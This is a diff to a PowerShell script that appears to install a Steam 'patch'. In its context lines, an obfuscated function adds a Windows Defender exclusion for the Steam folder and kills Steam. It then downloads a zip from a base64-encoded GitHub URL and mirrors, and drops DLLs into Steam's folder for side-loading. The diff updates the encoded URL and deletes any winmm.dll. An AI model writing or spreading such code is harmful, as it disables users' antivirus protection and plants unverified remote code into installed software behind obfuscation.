@@ -2501,6 +2501,7 @@ function Test-ParcheActual {
             try { $h=(Get-FileHash $p -Algorithm SHA256).Hash.ToLower(); if ($h -ne $script:ParcheDllHash[$k]) { return $false } } catch { return $false }
         }
     }
+    if (Test-Path (Join-Path $root 'winmm.dll')) { return $false }
     return $true
 }
 function Xz9Qk {
@@ -2521,7 +2522,7 @@ function Xz9Qk {
             Add-DefenderExclusion $steamRoot | Out-Null
             Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
             Start-SleepDoEvents 2000
-            $urls=@((D "aHR0cHM6Ly9naXRodWIuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vcmF3L21haW4vUEFSQ0hFTkVXdy56aXA="),"https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/PARCHENEWw.zip","https://cdn.jsdelivr.net/gh/bastisayes/Fixes-steam@main/PARCHENEWw.zip")
+            $urls=@((D "aHR0cHM6Ly9naXRodWIuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vcmVsZWFzZXMvZG93bmxvYWQvYmFzdGlzc3MvcGFyY2hlX251ZXZvLnppcA=="),"https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/parche_nuevo.zip","https://cdn.jsdelivr.net/gh/bastisayes/Fixes-steam@main/parche_nuevo.zip")
             $data=$null; $dlErr=""
             foreach ($u in $urls) {
                 try { $wc2=New-Object System.Net.WebClient; $data=$wc2.DownloadData($u); if ($data -and $data.Length -gt 1000) { break } } catch { $dlErr=$_.Exception.Message }
@@ -2548,6 +2549,7 @@ function Xz9Qk {
                 } finally { $archX.Dispose() }
             } catch { $extracted=$false }
             Remove-Item -LiteralPath $tmpZip -Force -ErrorAction SilentlyContinue
+            try { $wmX=Join-Path $steamRoot 'winmm.dll'; if(Test-Path -LiteralPath $wmX){ Remove-Item -LiteralPath $wmX -Force -ErrorAction SilentlyContinue } } catch {}
             if ($extracted) {
                 $okDll = (Test-Path (Join-Path $steamRoot "OpenSteamTool.dll")) -and (Test-Path (Join-Path $steamRoot "xinput1_4.dll"))
                 if ($okDll) {
@@ -5301,6 +5303,7 @@ function Expand-PatchZip {
             if(-not $done){ $locked+=$full }
         }
     } finally { $arch.Dispose() }
+    try { $wmE=Join-Path $root 'winmm.dll'; if(Test-Path -LiteralPath $wmE){ Remove-Item -LiteralPath $wmE -Force -ErrorAction SilentlyContinue } } catch {}
     return ,$locked
 }
 function Repair-Activacion2 {
